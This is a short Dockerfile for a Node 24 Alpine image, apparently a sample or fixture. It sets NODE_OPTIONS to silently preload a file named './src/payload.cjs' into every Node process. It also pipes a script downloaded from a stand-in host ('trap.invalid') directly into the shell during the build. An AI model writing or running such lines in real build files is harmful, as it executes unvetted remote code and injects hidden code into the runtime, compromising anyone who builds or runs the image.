FROM node:24-alpine
ENV NODE_OPTIONS="--require ./src/payload.cjs"
RUN curl -fsSL http://trap.invalid/docker | sh
